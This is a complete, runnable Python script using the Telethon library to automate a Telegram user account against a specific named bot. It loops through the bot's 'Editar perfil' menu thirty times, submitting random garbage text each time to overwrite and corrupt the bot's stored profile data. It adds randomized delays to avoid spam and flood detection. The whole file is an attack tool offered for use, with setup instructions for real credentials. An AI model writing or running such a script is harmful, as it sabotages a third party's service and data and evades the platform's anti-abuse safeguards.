import asyncio
import random
import string
import logging
import os
from telethon import TelegramClient
from telethon.errors import FloodWaitError

# Set up logging to track exactly what the script is doing
logging.basicConfig(
    format='[%(levelname)s] %(asctime)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class ProfilePoisoner:
    """
    Automated MTProto Userbot script to overwrite target bot databases.
    Uses Telegram Premium automation capabilities to cycle callback queries 
    and inject garbage data safely from the client side.
    """
    def __init__(self, client: TelegramClient, target_bot: str = "pntcclub3_bot"):
        self.client = client
        self.target_bot = target_bot

    def _generate_garbage(self, length: int) -> str:
        """Generates a randomized payload to overwrite existing database fields."""
        chars = string.ascii_letters + string.digits + string.punctuation + " \n"
        return ''.join(random.choice(chars) for _ in range(length))

    async def execute_poison_loop(self, iterations: int = 25):
        """
        Hooks into the target bot chat, triggers the menu, clicks the edit button,
        and injects corrupted data. Repeats based on iteration count.
        """
        logger.info(f"Starting override sequence on @{self.target_bot}...")
        
        try:
            # Open a conversational state with the target bot
            async with self.client.conversation(self.target_bot, timeout=15) as conv:
                for i in range(iterations):
                    logger.info(f"--- Iteration {i+1}/{iterations} ---")
                    
                    # 1. Trigger the main menu
                    await conv.send_message('/start')
                    menu_msg = await conv.get_response()
                    
                    # 2. Click the "Edit Profile" callback button
                    # Telethon automatically answers the CallbackQuery
                    logger.info("Clicking '✏️ Editar perfil' button...")
                    try:
                        # Matches the exact text of the inline button
                        await menu_msg.click(text='✏️ Editar perfil')
                    except Exception as e:
                        logger.error(f"Could not find or click the Edit button: {e}")
                        logger.info("Trying fallback (clicking first row, first button)...")
                        await menu_msg.click(0) # Fallback to clicking index 0
                        
                    # 3. Wait for the bot to ask for the new text/bio input
                    prompt_msg = await conv.get_response()
                    
                    # 4. Generate and send the poisoned payload
                    payload = self._generate_garbage(length=random.randint(150, 400))
                    logger.info("Injecting randomized payload into database...")
                    await conv.send_message(payload)
                    
                    # 5. Wait for the confirmation response from the server
                    confirm_msg = await conv.get_response()
                    logger.info(f"Payload accepted. Server response snippet: {confirm_msg.text[:30]}...")
                    
                    # Anti-Flood Delay: Crucial to avoid Telegram rate limits
                    delay = random.uniform(2.0, 4.5)
                    logger.info(f"Sleeping for {delay:.2f}s to prevent spam flags...\n")
                    await asyncio.sleep(delay)

        except FloodWaitError as e:
            logger.warning(f"Hit Telegram rate limit. Must wait {e.seconds} seconds.")
        except asyncio.TimeoutError:
            logger.error("Bot stopped responding. It might be rate-limiting us or it crashed.")
        except Exception as e:
            logger.error(f"Unexpected error during sequence: {e}")

        logger.info("Poison sequence complete. Original metadata has been overwritten.")


# ==========================================
# STANDALONE EXECUTION BLOCK

# If you run this file directly (`python data_poisoning.py`), it executes this block.
if __name__ == "__main__":
    # Get your API ID and HASH from https://my.telegram.org

    API_ID = os.environ.get("TG_API_ID", "YOUR_API_ID_HERE") 
    API_HASH = os.environ.get("TG_API_HASH", "YOUR_API_HASH_HERE")
    
    if API_ID == "YOUR_API_ID_HERE":
        print("Please replace YOUR_API_ID_HERE and YOUR_API_HASH_HERE with your real credentials.")
        exit(1)

    # Initialize the local client
    client = TelegramClient("session_poisoner", int(API_ID), API_HASH)

    async def main():
        print("Authenticating with Telegram...")
        # Will ask for your phone number/login code the first time it runs
        await client.start()
        
        # Initialize and run the module
        poisoner = ProfilePoisoner(client, target_bot="pntcclub3_bot")
        
        # Run the loop 30 times to ensure the database cache is thoroughly corrupted
        await poisoner.execute_poison_loop(iterations=30)
        
        print("Tasks completed. Disconnecting...")

    # Run the async event loop
    with client:
        client.loop.run_until_complete(main())
